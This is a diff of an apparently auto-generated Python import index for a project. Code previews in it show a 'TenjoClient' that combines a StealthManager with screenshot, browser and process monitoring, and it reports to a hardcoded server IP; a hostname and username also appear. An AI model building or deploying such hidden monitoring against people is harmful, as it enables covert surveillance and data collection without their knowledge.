@@ -9,6 +9,33 @@
         "documentation": {}
     },
     {
+        "label": "uuid",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "uuid",
+        "description": "uuid",
+        "detail": "uuid",
+        "documentation": {}
+    },
+    {
+        "label": "socket",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "socket",
+        "description": "socket",
+        "detail": "socket",
+        "documentation": {}
+    },
+    {
+        "label": "platform",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "platform",
+        "description": "platform",
+        "detail": "platform",
+        "documentation": {}
+    },
+    {
         "label": "datetime",
         "importPath": "datetime",
         "description": "datetime",
@@ -83,15 +110,6 @@
         "documentation": {}
     },
     {
-        "label": "platform",
-        "kind": 6,
-        "isExtraImport": true,
-        "importPath": "platform",
-        "description": "platform",
-        "detail": "platform",
-        "documentation": {}
-    },
-    {
         "label": "logging",
         "kind": 6,
         "isExtraImport": true,
@@ -101,12 +119,53 @@
         "documentation": {}
     },
     {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
         "label": "psutil",
         "kind": 6,
         "isExtraImport": true,
         "importPath": "psutil",
         "description": "psutil",
         "detail": "psutil",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "core.config",
+        "description": "core.config",
+        "isExtraImport": true,
+        "detail": "core.config",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "core.config",
+        "description": "core.config",
+        "isExtraImport": true,
+        "detail": "core.config",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "core.config",
+        "description": "core.config",
+        "isExtraImport": true,
+        "detail": "core.config",
+        "documentation": {}
+    },
+    {
+        "label": "Config",
+        "importPath": "core.config",
+        "description": "core.config",
+        "isExtraImport": true,
+        "detail": "core.config",
         "documentation": {}
     },
     {
@@ -158,31 +217,6 @@
         "description": "PIL",
         "isExtraImport": true,
         "detail": "PIL",
-        "documentation": {}
-    },
-    {
-        "label": "sys",
-        "kind": 6,
-        "isExtraImport": true,
-        "importPath": "sys",
-        "description": "sys",
-        "detail": "sys",
-        "documentation": {}
-    },
-    {
-        "label": "Config",
-        "importPath": "core.config",
-        "description": "core.config",
-        "isExtraImport": true,
-        "detail": "core.config",
-        "documentation": {}
-    },
-    {
-        "label": "Config",
-        "importPath": "core.config",
-        "description": "core.config",
-        "isExtraImport": true,
-        "detail": "core.config",
         "documentation": {}
     },
     {
@@ -340,7 +374,7 @@
         "kind": 6,
         "importPath": "client.src.core.config",
         "description": "client.src.core.config",
-        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = \"http://103.129.149.67\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    # Client Identification\n    CLIENT_ID = \"5fd85b0a-def8-432c-b10a-0a28c22f5baf\"  # From database registration\n    CLIENT_NAME = \"Yayasans-MacBook-Air.local\"\n    CLIENT_USER = \"yapi\"\n    # Monitoring Settings\n    SCREENSHOT_INTERVAL = 60  # seconds",
+        "peekOfCode": "class Config:\n    # Server Configuration\n    SERVER_URL = \"http://103.129.149.67\"\n    API_ENDPOINT = f\"{SERVER_URL}/api\"\n    # Client Identification - Dynamic generation\n    @staticmethod\n    def generate_client_id():\n        \"\"\"Generate unique client ID based on hardware\"\"\"\n        import hashlib\n        # Get unique identifiers",
         "detail": "client.src.core.config",
         "documentation": {}
     },
@@ -412,7 +446,7 @@
         "kind": 6,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "class TenjoClient:\n    def __init__(self):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, \"dummy-api-key\")\n        self.stealth_manager = StealthManager()\n        # Initialize modules\n        self.screen_capture = ScreenCapture(self.api_client)\n        self.browser_monitor = BrowserMonitor(self.api_client)\n        self.process_monitor = ProcessMonitor(self.api_client)\n        self.stream_handler = StreamHandler(self.api_client)",
+        "peekOfCode": "class TenjoClient:\n    def __init__(self):\n        # Use API_ENDPOINT from config\n        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)\n        self.stealth_manager = StealthManager()\n        # Initialize modules\n        self.screen_capture = ScreenCapture(self.api_client)\n        self.browser_monitor = BrowserMonitor(self.api_client)\n        self.process_monitor = ProcessMonitor(self.api_client)\n        self.stream_handler = StreamHandler(self.api_client)",
         "detail": "client.main",
         "documentation": {}
     },
